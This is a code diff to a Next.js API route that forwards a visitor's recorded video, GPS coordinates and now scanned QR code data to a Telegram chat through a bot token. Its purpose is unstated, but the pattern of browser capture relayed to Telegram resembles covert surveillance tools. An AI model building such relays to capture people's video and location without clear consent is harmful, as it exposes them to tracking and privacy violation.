@@ -13,7 +13,7 @@ export async function POST(req: NextRequest) {
   }
 
   try {
-    const { video, latitude, longitude } = await req.json(); // Expecting video, not selfie or separate audio
+    const { video, latitude, longitude, qrCodeData } = await req.json(); // Expecting video, latitude, longitude, and qrCodeData
 
     const messages: Promise<Response>[] = [];
 
@@ -27,13 +27,13 @@ export async function POST(req: NextRequest) {
       formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video.webm");
 
       messages.push(
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { // Changed to sendVideo
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
           method: "POST",
           body: formData,
         }).then(async res => {
           console.log("Video API response status:", res.status);
           if (!res.ok) {
-            const errorBody = await res.text(); // Get full error body
+            const errorBody = await res.text();
             console.error("Video API error response:", errorBody);
           }
           return res;
@@ -58,8 +58,32 @@ export async function POST(req: NextRequest) {
         }).then(async res => {
           console.log("Location API response status:", res.status);
           if (!res.ok) {
-            const errorBody = await res.text(); // Get full error body
+            const errorBody = await res.text();
             console.error("Location API error response:", errorBody);
+          }
+          return res;
+        })
+      );
+    }
+
+    // Send QR Code Data
+    if (qrCodeData) {
+      console.log("Attempting to send QR Code data...");
+      messages.push(
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `QR Code Scanned: ${qrCodeData}`,
+          }),
+        }).then(async res => {
+          console.log("QR Code message API response status:", res.status);
+          if (!res.ok) {
+            const errorBody = await res.text();
+            console.error("QR Code message API error response:", errorBody);
           }
           return res;
         })
@@ -68,9 +92,10 @@ export async function POST(req: NextRequest) {
 
     // Send a text message summary
     let summaryText = "Received data from web app:";
-    if (video) summaryText += "\n- Video recorded."; // Updated summary for video
+    if (video) summaryText += "\n- Video recorded.";
     if (latitude && longitude) summaryText += `\n- Location: Lat ${latitude}, Lng ${longitude}.`;
-    if (!video && !latitude && !longitude) summaryText = "No data received from web app (permissions denied or unavailable)."; // Updated condition
+    if (qrCodeData) summaryText += `\n- QR Code: ${qrCodeData}.`;
+    if (!video && !latitude && !longitude && !qrCodeData) summaryText = "No data received from web app (permissions denied or unavailable).";
 
     messages.push(
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -85,7 +110,7 @@ export async function POST(req: NextRequest) {
       }).then(async res => {
         console.log("Summary message API response status:", res.status);
         if (!res.ok) {
-            const errorBody = await res.text(); // Get full error body
+            const errorBody = await res.text();
             console.error("Summary message API error response:", errorBody);
         }
         return res;
